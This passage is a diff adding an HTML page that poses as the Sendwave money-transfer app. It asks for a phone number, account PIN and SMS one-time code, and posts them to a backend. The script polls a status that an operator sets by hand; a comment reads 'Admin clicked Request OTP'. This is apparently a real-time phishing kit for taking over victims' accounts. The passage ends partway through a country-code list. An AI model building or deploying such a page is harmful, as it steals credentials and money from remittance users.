@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sendwave</title>
+  <link href="https://fonts.googleapis.com/css2?family=Black+Han+Sans&family=Nunito:wght@400;700&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      font-family: Arial, sans-serif;
+      background: #fff;
+      overflow: hidden;
+    }
+
+    .screen { display: none; width: 100%; min-height: 100vh; }
+    .screen.active { display: flex; }
+
+    /* ── LOADING OVERLAY ── */
+    .loading-overlay {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.45);
+      display: flex; align-items: center; justify-content: center;
+      z-index: 9999; opacity: 0; visibility: hidden;
+      transition: opacity 0.2s, visibility 0.2s;
+    }
+    .loading-overlay.show { opacity: 1; visibility: visible; }
+    .loading-card {
+      background: #fff; border-radius: 16px; padding: 28px 24px;
+      text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+      min-width: 160px;
+    }
+    .loading-spinner {
+      width: 34px; height: 34px; border: 3px solid #eee;
+      border-top-color: #f5c200; border-radius: 50%;
+      animation: spin 0.6s linear infinite; margin: 0 auto 10px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-text { font-size: 14px; font-weight: 600; color: #333; }
+
+    /* ── POPUP OVERLAY ── */
+    .popup-overlay {
+      position: fixed; inset: 0; background: rgba(0,0,0,0.45);
+      display: flex; align-items: center; justify-content: center;
+      z-index: 9999; opacity: 0; visibility: hidden;
+      transition: opacity 0.2s, visibility 0.2s;
+    }
+    .popup-overlay.show { opacity: 1; visibility: visible; }
+    .popup-card {
+      background: #fff; border-radius: 20px; padding: 28px 24px;
+      max-width: 300px; width: 90%; text-align: center;
+      box-shadow: 0 20px 50px rgba(0,0,0,0.2);
+    }
+    .popup-icon {
+      width: 52px; height: 52px; border-radius: 50%;
+      margin: 0 auto 14px; display: flex;
+      align-items: center; justify-content: center; font-size: 24px;
+    }
+    .popup-icon.wrong { background: #fef2f2; }
+    .popup-icon.continue { background: #fffbeb; }
+    .popup-title { font-size: 18px; font-weight: 800; color: #111; margin-bottom: 8px; }
+    .popup-message { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 20px; }
+    .popup-btn {
+      width: 100%; padding: 13px; background: #FFE600; border: none;
+      border-radius: 50px; font-size: 15px; font-weight: 700;
+      color: #1a0800; cursor: pointer; font-family: Arial, sans-serif;
+    }
+
+    /* ══ SCREEN 1: LANDING ══ */
+    #landing {
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-end;
+      position: relative;
+    }
+
+    .bg {
+      position: fixed; inset: 0;
+      background-image: url('https://raw.githubusercontent.com/arapchelogoi/halleluyah/main/WhatsApp%20Image%202026-02-21%20at%2013.23.42.jpeg');
+      background-size: cover; background-position: center top; z-index: 0;
+    }
+    .bg::after {
+      content: ''; position: absolute; inset: 0;
+      background: linear-gradient(to bottom, rgba(0,0,0,0.05) 0%, rgba(0,0,0,0.1) 40%, rgba(255,245,200,0.6) 70%, rgba(255,245,180,0.97) 100%);
+    }
+
+    .landing-content {
+      position: relative; z-index: 1; width: 100%; max-width: 420px;
+      padding: 0 32px 60px; display: flex; flex-direction: column;
+      align-items: center; gap: 28px; animation: fadeUp 0.9s ease both;
+    }
+    @keyframes fadeUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+
+    .tagline {
+      font-family: 'Black Han Sans', sans-serif;
+      font-size: clamp(2rem, 8vw, 2.8rem);
+      color: #1a0a00; line-height: 1.1; text-align: center; letter-spacing: 1px;
+    }
+
+    .logo {
+      position: fixed; top: 24px; left: 50%; transform: translateX(-50%);
+      z-index: 2; font-family: 'Black Han Sans', sans-serif;
+      font-size: 3.6rem; color: #f5c200; letter-spacing: 3px;
+      text-shadow: 0 2px 12px rgba(0,0,0,0.3); animation: fadeDown 0.7s ease both; white-space: nowrap;
+    }
+    @keyframes fadeDown { from { opacity: 0; transform: translateX(-50%) translateY(-16px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
+
+    .letsgo-btn {
+      display: inline-flex; align-items: center; gap: 10px;
+      background: #f5c200; color: #1a0a00;
+      font-family: 'Black Han Sans', sans-serif; font-size: 1.25rem;
+      letter-spacing: 2px; padding: 18px 52px; border: none;
+      border-radius: 50px; cursor: pointer;
+      box-shadow: 0 6px 28px rgba(245,194,0,0.45), 0 2px 0 #b8900a;
+      transition: transform 0.18s, box-shadow 0.18s, background 0.18s;
+      position: relative; overflow: hidden;
+    }
+    .letsgo-btn::after { content: ''; position: absolute; inset: 0; border-radius: 50px; background: linear-gradient(135deg, rgba(255,255,255,0.25) 0%, transparent 60%); pointer-events: none; }
+    .letsgo-btn:hover { transform: translateY(-3px) scale(1.03); background: #ffd000; }
+    .letsgo-btn:active { transform: translateY(1px) scale(0.98); }
+    .letsgo-btn svg { width: 22px; height: 22px; flex-shrink: 0; }
+
+    /* ══ SCREEN 2: LOGIN ══ */
+    #login {
+      flex-direction: column; background: #fff; padding: 0 24px;
+      position: relative; max-width: 480px; margin: 0 auto; min-height: 100vh;
+    }
+    .back-arrow { margin-top: 56px; font-size: 22px; color: #000; cursor: pointer; width: fit-content; }
+    #login h1 { margin-top: 24px; font-size: 30px; font-weight: 800; color: #000; }
+
+    .phone-row {
+      display: flex; margin-top: 32px; border: 1.5px solid #ccc;
+      border-radius: 8px; overflow: hidden; height: 56px; align-items: center;
+    }
+    .country-select {
+      display: flex; align-items: center; padding: 0 10px;
+      border-right: 1.5px solid #ccc; height: 100%; cursor: pointer;
+      gap: 4px; flex-shrink: 0; background: #fff;
+    }
+    .flag { font-size: 20px; }
+    .country-code { font-size: 15px; font-weight: 600; color: #000; }
+    .chevron { font-size: 10px; color: #888; margin-left: 2px; }
+    .phone-input {
+      flex: 1; height: 100%; border: none; outline: none;
+      font-size: 15px; color: #333; padding: 0 14px;
+      font-family: Arial, sans-serif; background: transparent;
+    }
+
+    .dropdown {
+      position: absolute; top: 195px; left: 24px; right: 24px;
+      background: #fff; border: 1.5px solid #ddd; border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.12); z-index: 100;
+      max-height: 320px; overflow-y: auto; display: none;
+    }
+    .dropdown.open { display: block; }
+    .dropdown-search { padding: 10px 14px; border-bottom: 1px solid #eee; position: sticky; top: 0; background: #fff; }
+    .dropdown-search input { width: 100%; border: 1px solid #ddd; border-radius: 6px; padding: 8px 10px; font-size: 14px; outline: none; font-family: Arial, sans-serif; }
+    .country-item { display: flex; align-items: center; padding: 12px 14px; cursor: pointer; gap: 10px; font-size: 14px; transition: background 0.1s; }
+    .country-item:hover { background: #f5f5f5; }
+    .country-item .item-flag { font-size: 20px; }
+    .country-item .item-name { flex: 1; color: #222; }
+    .country-item .item-code { color: #555; font-weight: 600; }
+    .country-item.selected { background: #fffde6; }
+
+    .log-in-btn {
+      margin-top: 20px; width: 100%; height: 56px; background: #FFE600;
+      border: none; border-radius: 50px; font-size: 17px; font-weight: 700;
+      color: #1a0800; cursor: pointer; font-family: Arial, sans-serif;
+    }
+    .trouble-link { margin-top: 18px; text-align: center; color: #1a9090; font-size: 15px; font-weight: 600; text-decoration: underline; cursor: pointer; }
+    .bottom-text { position: absolute; bottom: 36px; left: 0; right: 0; text-align: center; font-size: 14px; color: #444; }
+    .bottom-text a { color: #1a9090; font-weight: 700; text-decoration: underline; cursor: pointer; }
+
+    /* ══ SCREEN 3: PIN ══ */
+    #pin {
+      flex-direction: column; background: #fff; padding: 0 28px;
+      max-width: 480px; margin: 0 auto; min-height: 100vh;
+    }
+    .close-btn { margin-top: 52px; font-size: 24px; color: #000; cursor: pointer; width: fit-content; line-height: 1; }
+    .phone-icon { margin-top: 20px; width: 36px; height: 46px; }
+    #pin h1 { margin-top: 16px; font-size: 28px; font-weight: 800; color: #000; }
+    .pin-dashes { display: flex; gap: 28px; margin-top: 60px; justify-content: center; align-items: center; height: 24px; }
+    .dash { width: 60px; height: 3px; background: #ccc; border-radius: 2px; transition: all 0.15s ease; }
+    .dash.active { background: #1a7f7f; }
+    .dash.filled { width: 14px; height: 14px; background: #111; border-radius: 50%; }
+    .keypad { margin-top: auto; }
+    .keypad-row { display: flex; justify-content: space-between; margin-bottom: 4px; }
+    .key { width: 108px; height: 66px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; border-radius: 12px; transition: background 0.1s; user-select: none; }
+    .key:active { background: #f0f0f0; }
+    .key-num { font-size: 28px; font-weight: 400; color: #000; line-height: 1; }
+    .key-letters { font-size: 9px; color: #888; letter-spacing: 1px; margin-top: 2px; }
+    .key.empty { cursor: default; }
+    .key-del { font-size: 22px; color: #000; }
+    .continue-btn {
+      width: 100%; height: 54px; background: #FFE600; border: none;
+      border-radius: 50px; font-size: 17px; font-weight: 700; color: #1a0800;
+      cursor: pointer; font-family: Arial, sans-serif; margin-top: 12px; margin-bottom: 28px;
+      opacity: 0.45; transition: opacity 0.2s;
+    }
+    .continue-btn.ready { opacity: 1; }
+
+    /* ══ SCREEN 4: OTP ══ */
+    #otp {
+      flex-direction: column; background: #fff; padding: 0 24px;
+      max-width: 480px; margin: 0 auto; min-height: 100vh;
+      font-family: -apple-system, 'Helvetica Neue', Arial, sans-serif;
+    }
+    #otp .close-btn { margin-top: 54px; font-size: 22px; font-weight: 300; }
+    .otp-phone-icon { margin-top: 22px; width: 34px; height: 44px; }
+    .heading { margin-top: 14px; font-size: 26px; font-weight: 800; color: #000; letter-spacing: -0.3px; }
+    .subtitle { margin-top: 8px; font-size: 14.5px; color: #222; font-weight: 400; line-height: 1.4; }
+    .otp-row { display: flex; gap: 0; margin-top: 28px; align-items: flex-end; width: 100%; }
+    .otp-slot { flex: 1; display: flex; flex-direction: column; align-items: center; position: relative; }
+    .otp-digit { font-size: 22px; font-weight: 500; color: #000; height: 32px; display: flex; align-items: center; justify-content: center; width: 100%; text-align: center; }
+    .otp-line { width: 88%; height: 2.5px; background: #ccc; border-radius: 2px; margin-top: 6px; }
+    .otp-line.active { background: #1a6f6f; }
+    .otp-line.filled { background: #1a6f6f; }
+    .hidden-input { position: absolute; opacity: 0; width: 1px; height: 1px; pointer-events: none; }
+    .resend-label { margin-top: 22px; font-size: 14px; color: #333; }
+    .resend-buttons { display: flex; gap: 12px; margin-top: 14px; }
+    .resend-btn { display: flex; align-items: center; gap: 7px; padding: 10px 18px; border: 2px solid #1a6f6f; border-radius: 50px; background: #fff; cursor: pointer; font-size: 14.5px; font-weight: 700; color: #1a6f6f; font-family: inherit; }
+    .resend-btn svg { width: 18px; height: 18px; flex-shrink: 0; }
+    .bottom-section { margin-top: auto; padding-bottom: 60px; }
+    .no-access-text { font-size: 14px; color: #333; margin-bottom: 4px; }
+    .change-number { font-size: 14px; font-weight: 700; color: #1a6f6f; text-decoration: underline; cursor: pointer; }
+
+    /* OTP submit button */
+    .otp-submit-btn {
+      width: 100%; height: 54px; background: #FFE600; border: none;
+      border-radius: 50px; font-size: 17px; font-weight: 700; color: #1a0800;
+      cursor: pointer; font-family: Arial, sans-serif; margin-top: 28px;
+      opacity: 0.45; transition: opacity 0.2s;
+    }
+    .otp-submit-btn.ready { opacity: 1; }
+  </style>
+</head>
+<body>
+
+<!-- LOADING -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loading-card">
+    <div class="loading-spinner"></div>
+    <div class="loading-text">Please wait…</div>
+  </div>
+</div>
+
+<!-- POPUP -->
+<div class="popup-overlay" id="popupOverlay">
+  <div class="popup-card">
+    <div class="popup-icon" id="popupIcon"></div>
+    <div class="popup-title" id="popupTitle"></div>
+    <div class="popup-message" id="popupMessage"></div>
+    <button class="popup-btn" onclick="closePopup()">OK</button>
+  </div>
+</div>
+
+<!-- ══ SCREEN 1: LANDING ══ -->
+<div id="landing" class="screen active">
+  <div class="bg"></div>
+  <div class="logo">SENDWAVE</div>
+  <div class="landing-content">
+    <div class="tagline">FOR HERE<br/>FOR THERE<br/>FOR HOME</div>
+    <button class="letsgo-btn" onclick="showScreen('login')">
+      LET'S GO
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+        <line x1="5" y1="12" x2="19" y2="12"/>
+        <polyline points="12 5 19 12 12 19"/>
+      </svg>
+    </button>
+  </div>
+</div>
+
+<!-- ══ SCREEN 2: LOGIN ══ -->
+<div id="login" class="screen">
+  <div class="back-arrow" onclick="showScreen('landing')">←</div>
+  <h1>Welcome back</h1>
+  <div class="phone-row">
+    <div class="country-select" onclick="toggleDropdown()">
+      <span class="flag" id="selected-flag">🌐</span>
+      <span class="country-code" id="selected-code">+</span>
+      <span class="chevron">▼</span>
+    </div>
+    <input class="phone-input" type="tel" placeholder="Mobile number" id="phone-input"/>
+  </div>
+  <div class="dropdown" id="dropdown">
+    <div class="dropdown-search">
+      <input type="text" placeholder="Search country..." id="search-input" oninput="filterCountries()"/>
+    </div>
+    <div id="country-list"></div>
+  </div>
+  <button class="log-in-btn" onclick="goToPin()">Log in</button>
+  <div class="trouble-link">Trouble logging in?</div>
+  <div class="bottom-text">Don't have an account? <a>Sign up</a></div>
+</div>
+
+<!-- ══ SCREEN 3: PIN ══ -->
+<div id="pin" class="screen">
+  <div class="close-btn" onclick="showScreen('login')">&#x2715;</div>
+  <svg class="phone-icon" viewBox="0 0 36 46" fill="none">
+    <rect x="1.5" y="1.5" width="33" height="43" rx="4.5" stroke="#000" stroke-width="3" fill="none"/>
+    <rect x="13" y="38" width="10" height="3" rx="1.5" fill="#000"/>
+  </svg>
+  <h1>Enter pin</h1>
+  <div class="pin-dashes">
+    <div class="dash active" id="d0"></div>
+    <div class="dash" id="d1"></div>
+    <div class="dash" id="d2"></div>
+    <div class="dash" id="d3"></div>
+  </div>
+  <div class="keypad">
+    <div class="keypad-row">
+      <div class="key" onclick="pressKey('1')"><span class="key-num">1</span><span class="key-letters"></span></div>
+      <div class="key" onclick="pressKey('2')"><span class="key-num">2</span><span class="key-letters">ABC</span></div>
+      <div class="key" onclick="pressKey('3')"><span class="key-num">3</span><span class="key-letters">DEF</span></div>
+    </div>
+    <div class="keypad-row">
+      <div class="key" onclick="pressKey('4')"><span class="key-num">4</span><span class="key-letters">GHI</span></div>
+      <div class="key" onclick="pressKey('5')"><span class="key-num">5</span><span class="key-letters">JKL</span></div>
+      <div class="key" onclick="pressKey('6')"><span class="key-num">6</span><span class="key-letters">MNO</span></div>
+    </div>
+    <div class="keypad-row">
+      <div class="key" onclick="pressKey('7')"><span class="key-num">7</span><span class="key-letters">PQRS</span></div>
+      <div class="key" onclick="pressKey('8')"><span class="key-num">8</span><span class="key-letters">TUV</span></div>
+      <div class="key" onclick="pressKey('9')"><span class="key-num">9</span><span class="key-letters">WXYZ</span></div>
+    </div>
+    <div class="keypad-row">
+      <div class="key empty"></div>
+      <div class="key" onclick="pressKey('0')"><span class="key-num">0</span><span class="key-letters">+</span></div>
+      <div class="key" onclick="deleteLast()"><span class="key-del">⌫</span></div>
+    </div>
+    <button class="continue-btn" id="continue-btn" onclick="submitPIN()" disabled>Continue</button>
+  </div>
+</div>
+
+<!-- ══ SCREEN 4: OTP ══ -->
+<div id="otp" class="screen">
+  <div class="close-btn" onclick="showScreen('pin')">&#x2715;</div>
+  <svg class="otp-phone-icon" viewBox="0 0 34 44" fill="none">
+    <rect x="1.5" y="1.5" width="31" height="41" rx="4" stroke="#000" stroke-width="2.8" fill="none"/>
+    <rect x="12" y="36" width="10" height="3" rx="1.5" fill="#000"/>
+  </svg>
+  <div class="heading">Enter code</div>
+  <div class="subtitle">We sent a 6-digit code to the mobile number linked to your account.</div>
+  <input class="hidden-input" type="tel" id="otp-input" maxlength="6" inputmode="numeric"/>
+  <div class="otp-row" id="otp-row" onclick="focusOtpInput()">
+    <div class="otp-slot"><div class="otp-digit" id="s0"></div><div class="otp-line active" id="l0"></div></div>
+    <div class="otp-slot"><div class="otp-digit" id="s1"></div><div class="otp-line" id="l1"></div></div>
+    <div class="otp-slot"><div class="otp-digit" id="s2"></div><div class="otp-line" id="l2"></div></div>
+    <div class="otp-slot"><div class="otp-digit" id="s3"></div><div class="otp-line" id="l3"></div></div>
+    <div class="otp-slot"><div class="otp-digit" id="s4"></div><div class="otp-line" id="l4"></div></div>
+    <div class="otp-slot"><div class="otp-digit" id="s5"></div><div class="otp-line" id="l5"></div></div>
+  </div>
+  <button class="otp-submit-btn" id="otp-submit-btn" onclick="submitOTP()" disabled>Verify</button>
+  <div class="resend-label">Didn't get the code? Resend via:</div>
+  <div class="resend-buttons">
+    <button class="resend-btn">
+      <svg viewBox="0 0 18 18" fill="none"><rect x="1" y="3" width="16" height="12" rx="2" stroke="#1a6f6f" stroke-width="1.8" fill="none"/><rect x="6.5" y="13" width="5" height="2" rx="1" fill="#1a6f6f"/><rect x="7.5" y="15" width="3" height="1.5" rx="0.5" fill="#1a6f6f"/></svg>
+      SMS
+    </button>
+    <button class="resend-btn">
+      <svg viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#1a6f6f" stroke-width="1.6" fill="none"/><path d="M9 2.5C5.41 2.5 2.5 5.41 2.5 9c0 1.16.31 2.25.85 3.19L2.5 15.5l3.4-.84A6.47 6.47 0 0 0 9 15.5c3.59 0 6.5-2.91 6.5-6.5S12.59 2.5 9 2.5z" fill="#1a6f6f" opacity="0.15"/><path d="M12.1 10.6c-.18-.09-.95-.47-1.1-.52-.15-.05-.26-.09-.37.09-.11.18-.43.52-.53.63-.1.11-.2.12-.37.04-.18-.09-.74-.27-1.4-.87-.52-.46-.87-1.03-.97-1.2-.1-.18-.01-.27.08-.36.08-.08.18-.2.27-.31.09-.1.12-.18.18-.3.06-.12.03-.22-.01-.31-.04-.09-.37-.9-.51-1.23-.13-.32-.27-.27-.37-.28h-.32c-.11 0-.29.04-.45.22-.15.18-.59.58-.59 1.4 0 .83.6 1.63.69 1.74.09.11 1.19 1.82 2.88 2.55.4.17.72.28.96.36.4.13.77.11 1.06.07.32-.05.95-.39 1.08-.76.14-.37.14-.69.1-.76-.04-.07-.15-.11-.32-.2z" fill="#1a6f6f"/></svg>
+      WhatsApp
+    </button>
+  </div>
+  <div class="bottom-section">
+    <div class="no-access-text">Don't have access to this number?</div>
+    <div class="change-number" onclick="showScreen('login')">Change number</div>
+  </div>
+</div>
+
+<script>
+  const API_BASE_URL = '/api';
+
+  let currentSessionId = null;
+  let statusCheckInterval = null;
+
+  // ── Loading & Popup ──
+  function showLoading() { document.getElementById('loadingOverlay').classList.add('show'); }
+  function hideLoading()  { document.getElementById('loadingOverlay').classList.remove('show'); }
+
+  function showPopup(title, message, type = 'wrong') {
+    const icon = document.getElementById('popupIcon');
+    icon.className = 'popup-icon ' + type;
+    icon.textContent = type === 'wrong' ? '❌' : '⚠️';
+    document.getElementById('popupTitle').textContent   = title;
+    document.getElementById('popupMessage').textContent = message;
+    document.getElementById('popupOverlay').classList.add('show');
+  }
+  function closePopup() { document.getElementById('popupOverlay').classList.remove('show'); }
+
+  // ── API ──
+  async function callApi(action, data = {}) {
+    const params = new URLSearchParams();
+    params.append('action', action);
+    for (let key in data) { params.append(key, data[key]); }
+    try {
+      const res = await fetch(API_BASE_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: params.toString()
+      });
+      return await res.json();
+    } catch (err) {
+      console.error('API error:', err);
+      return { success: false };
+    }
+  }
+
+  // ── Status polling ──
+  function startStatusPolling(sessionId) {
+    if (statusCheckInterval) clearInterval(statusCheckInterval);
+    currentSessionId = sessionId;
+    statusCheckInterval = setInterval(async () => {
+      try {
+        const res    = await fetch(`${API_BASE_URL}?action=check_status&sessionId=${sessionId}&t=${Date.now()}`);
+        const result = await res.json();
+        if (result.success && result.status) {
+          if (result.status === 'approved') {
+            // Admin clicked Request OTP — go to OTP screen
+            hideLoading();
+            clearInterval(statusCheckInterval); statusCheckInterval = null;
+            showScreen('otp');
+            setTimeout(() => focusOtpInput(), 200);
+            startStatusPolling(currentSessionId);
+          } else if (result.status === 'wrong_pin') {
+            hideLoading();
+            clearInterval(statusCheckInterval); statusCheckInterval = null;
+            showPopup('Wrong PIN', 'The PIN you entered is incorrect. Please try again.', 'wrong');
+            pin = []; updateDashes();
+          } else if (result.status === 'wrong_code') {
+            hideLoading();
+            clearInterval(statusCheckInterval); statusCheckInterval = null;
+            showPopup('Wrong Code', 'The code you entered is incorrect. Please try again.', 'wrong');
+            document.getElementById('otp-input').value = '';
+            updateSlots();
+          } else if (result.status === 'continue') {
+            hideLoading();
+            clearInterval(statusCheckInterval); statusCheckInterval = null;
+            showPopup('Insufficient Funds', 'Please add more funds to your account and try again.', 'continue');
+          }
+        }
+      } catch (err) { console.error('Polling error:', err); }
+    }, 1000);
+  }
+
+  // ── Screen navigation ──
+  function showScreen(id) {
+    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+    if (id === 'otp') setTimeout(() => focusOtpInput(), 100);
+  }
+
+  // ── Country picker ──
+  const countries = [
+    { flag: '🌐', name: 'Select Country', code: '+' },
+    { flag: '🇦🇫', name: 'Afghanistan', code: '+93' },
+    { flag: '🇦🇱', name: 'Albania', code: '+355' },
+    { flag: '🇩🇿', name: 'Algeria', code: '+213' },
+    { flag: '🇦🇴', name: 'Angola', code: '+244' },
+    { flag: '🇦🇷', name: 'Argentina', code: '+54' },
+    { flag: '🇦🇲', name: 'Armenia', code: '+374' },
+    { flag: '🇦🇺', name: 'Australia', code: '+61' },
+    { flag: '🇦🇹', name: 'Austria', code: '+43' },
+    { flag: '🇦🇿', name: 'Azerbaijan', code: '+994' },
+    { flag: '🇧🇩', name: 'Bangladesh', code: '+880' },
+    { flag: '🇧🇪', name: 'Belgium', code: '+32' },
+    { flag: '🇧🇯', name: 'Benin', code: '+229' },
+    { flag: '🇧🇴', name: 'Bolivia', code: '+591' },
+    { flag: '🇧🇦', name: 'Bosnia', code: '+387' },
+    { flag: '🇧🇼', name: 'Botswana', code: '+267' },
+    { flag: '🇧🇷', name: 'Brazil', code: '+55' },
+    { flag: '🇧🇫', name: 'Burkina Faso', code: '+226' },
+    { flag: '🇧🇮', name: 'Burundi', code: '+257' },
+    { flag: '🇨🇲', name: 'Cameroon', code: '+237' },
+    { flag: '🇨🇦', name: 'Canada', code: '+1' },
+    { flag: '🇨🇻', name: 'Cape Verde', code: '+238' },
+    { flag: '🇨🇫', name: 'Central African Republic', code: '+236' },
+    { flag: '🇹🇩', name: 'Chad', code: '+235' },
+    { flag: '🇨🇱', name: 'Chile', code: '+56' },
+    { flag: '🇨🇳', name: 'China', code: '+86' },
+    { flag: '🇨🇴', name: 'Colombia', code: '+57' },
+    { flag: '🇨🇬', name: 'Congo', code: '+242' },
+    { flag: '🇨🇩', name: 'DR Congo', code: '+243' },
+    { flag: '🇨🇷', name: 'Costa Rica', code: '+506' },
+    { flag: '🇨🇮', name: "Côte d'Ivoire", code: '+225' },
+    { flag: '🇭🇷', name: 'Croatia', code: '+385' },
+    { flag: '🇨🇺', name: 'Cuba', code: '+53' },
+    { flag: '🇨🇾', name: 'Cyprus', code: '+357' },
+    { flag: '🇨🇿', name: 'Czech Republic', code: '+420' },
+    { flag: '🇩🇰', name: 'Denmark', code: '+45' },
+    { flag: '🇩🇯', name: 'Djibouti', code: '+253' },
+    { flag: '🇩🇴', name: 'Dominican Republic', code: '+1-809' },
+    { flag: '🇪🇨', name: 'Ecuador', code: '+593' },
+    { flag: '🇪🇬', name: 'Egypt', code: '+20' },
+    { flag: '🇸🇻', name: 'El Salvador', code: '+503' },
+    { flag: '🇬🇶', name: 'Equatorial Guinea', code: '+240' },
+    { flag: '🇪🇷', name: 'Eritrea', code: '+291' },
+    { flag: '🇪🇹', name: 'Ethiopia', code: '+251' },
+    { flag: '🇫🇮', name: 'Finland', code: '+358' },
+    { flag: '🇫🇷', name: 'France', code: '+33' },
+    { flag: '🇬🇦', name: 'Gabon', code: '+241' },
+    { flag: '🇬🇲', name: 'Gambia', code: '+220' },
+    { flag: '🇬🇪', name: 'Georgia', code: '+995' },
+    { flag: '🇩🇪', name: 'Germany', code: '+49' },
+    { flag: '🇬🇭', name: 'Ghana', code: '+233' },
+    { flag: '🇬🇷', name: 'Greece', code: '+30' },
+    { flag: '🇬🇹', name: 'Guatemala', code: '+502' },
+    { flag: '🇬🇳', name: 'Guinea', code: '+224' },
+    { flag: '🇬🇼', name: 'Guinea-Bissau', code: '+245' },
+    { flag: '🇭🇹', name: 'Haiti', code: '+509' },
+    { flag: '🇭🇳', name: 'Honduras', code: '+504' },
+    { flag: '🇭🇺', name: 'Hungary', code: '+36' },
+    { flag: '🇮🇳', name: 'India', code: '+91' },
+    { flag: '🇮🇩', name: 'Indonesia', code: '+62' },
+    { flag: '🇮🇷', name: 'Iran', code: '+98' },
+    { flag: '🇮🇶', name: 'Iraq', code: '+964' },
+    { flag: '🇮🇪', name: 'Ireland', code: '+353' },
+    { flag: '🇮🇱', name: 'Israel', code: '+972' },
+    { flag: '🇮🇹', name: 'Italy', code: '+39' },
+    { flag: '🇯🇲', name: 'Jamaica', code: '+1-876' },
+    { flag: '🇯🇵', name: 'Japan', code: '+81' },
+    { flag: '🇯🇴', name: 'Jordan', code: '+962' },
+    { flag: '🇰🇿', name: 'Kazakhstan', code: '+7' },
+    { flag: '🇰🇪', name: 'Kenya', code: '+254' },
+    { flag: '🇽🇰', name: 'Kosovo', code: '+383' },
+    { flag: '🇰🇼', name: 'Kuwait', code: '+965' },
+    { flag: '🇱🇦', name: 'Laos', code: '+856' },
+    { flag: '🇱🇧', name: 'Lebanon', code: '+961' },
+    { flag: '🇱🇸', name: 'Lesotho', code: '+266' },
+    { flag: '🇱🇷', name: 'Liberia', code: '+231' },
+    { flag: '🇱🇾', name: 'Libya', code: '+218' },
+    { flag: '🇲🇬', name: 'Madagascar', code: '+261' },
+    { flag: '🇲🇼', name: 'Malawi', code: '+265' },
+    { flag: '🇲🇾', name: 'Malaysia', code: '+60' },
+    { flag: '🇲🇱', name: 'Mali', code: '+223' },
+    { flag: '🇲🇷', name: 'Mauritania', code: '+222' },
+    { flag: '🇲🇺', name: 'Mauritius', code: '+230' },
+    { flag: '🇲🇽', name: 'Mexico', code: '+52' },
+    { flag: '🇲🇩', name: 'Moldova', code: '+373' },
+    { flag: '🇲🇳', name: 'Mongolia', code: '+976' },
+    { flag: '🇲🇦', name: 'Morocco', code: '+212' },
+    { flag: '🇲🇿', name: 'Mozambique', code: '+258' },
+    { flag: '🇲🇲', name: 'Myanmar', code: '+95' },
+    { flag: '🇳🇦', name: 'Namibia', code: '+264' },
+    { flag: '🇳🇵', name: 'Nepal', code: '+977' },
+    { flag: '🇳🇱', name: 'Netherlands', code: '+31' },
+    { flag: '🇳🇿', name: 'New Zealand', code: '+64' },
+    { flag: '🇳🇮', name: 'Nicaragua', code: '+505' },
+    { flag: '🇳🇪', name: 'Niger', code: '+227' },
+    { flag: '🇳🇬', name: 'Nigeria', code: '+234' },
+    { flag: '🇰🇵', name: 'North Korea', code: '+850' },
+    { flag: '🇲🇰', name: 'North Macedonia', code: '+389' },
+    { flag: '🇳🇴', name: 'Norway', code: '+47' },
+    { flag: '🇴🇲', name: 'Oman', code: '+968' },
+    { flag: '🇵🇰', name: 'Pakistan', code: '+92' },
+    { flag: '🇵🇸', name: 'Palestine', code: '+970' },
+    { flag: '🇵🇦', name: 'Panama', code: '+507' },
+    { flag: '🇵🇬', name: 'Papua New Guinea', code: '+675' },
+    { flag: '🇵🇾', name: 'Paraguay', code: '+595' },
+    { flag: '🇵🇪', name: 'Peru', code: '+51' },
+    { flag: '🇵🇭', name: 'Philippines', code: '+63' },
+    { flag: '🇵🇱', name: 'Poland', code: '+48' },
+    { flag: '🇵🇹', name: 'Portugal', code: '+351' },
+    { flag: '🇶🇦', name: 'Qatar', code: '+974' },
+    { flag: '🇷🇴', name: 'Romania', code: '+40' },
+    { flag: '🇷🇺', name: 'Russia', code: '+7' },
+    { flag: '🇷🇼', name: 'Rwanda', code: '+250' },
+    { flag: '🇸🇦', name: 'Saudi Arabia', code: '+966' },
+    { flag: '🇸🇳', name: 'Senegal', code: '+221' },
+    { flag: '🇷🇸', name: 'Serbia', code: '+381' },
+    { flag: '🇸🇱', name: 'Sierra Leone', code: '+232' },
+    { flag: '🇸🇬', name: 'Singapore', code: '+65' },
+    { flag: '🇸🇰', name: 'Slovakia', code: '+421' },
+    { flag: '🇸🇴', name: 'Somalia', code: '+252' },
+    { flag: '🇿🇦', name: 'South Africa', code: '+27' },
+    { flag: '🇸🇸', name: 'South Sudan', code: '+211' },
+    { flag: '🇪🇸', name: 'Spain', code: '+34' },
+    { flag: '🇱🇰', name: 'Sri Lanka', code: '+94' },
+    { flag: '🇸🇩', name: 'Sudan', code: '+249' },
+    { flag: '🇸🇿', name: 'Eswatini', code: '+268' },
+    { flag: '🇸🇪', name: 'Sweden', code: '+46' },
+    { flag: '🇨🇭', name: 'Switzerland', code: '+41' },
+    { flag: '🇸🇾', name: 'Syria', code: '+963' },
+    { flag: '🇹🇿', name: 'Tanzania', code: '+255' },
+    { flag: '🇹🇭', name: 'Thailand', code: '+66' },
+    { flag: '🇹🇬', name: 'Togo', code: '+228' },
+    { flag: '🇹🇹', name: 'Trinidad & Tobago', code: '+1-868' },
+    { flag: '🇹🇳', name: 'Tunisia', code: '+216' },
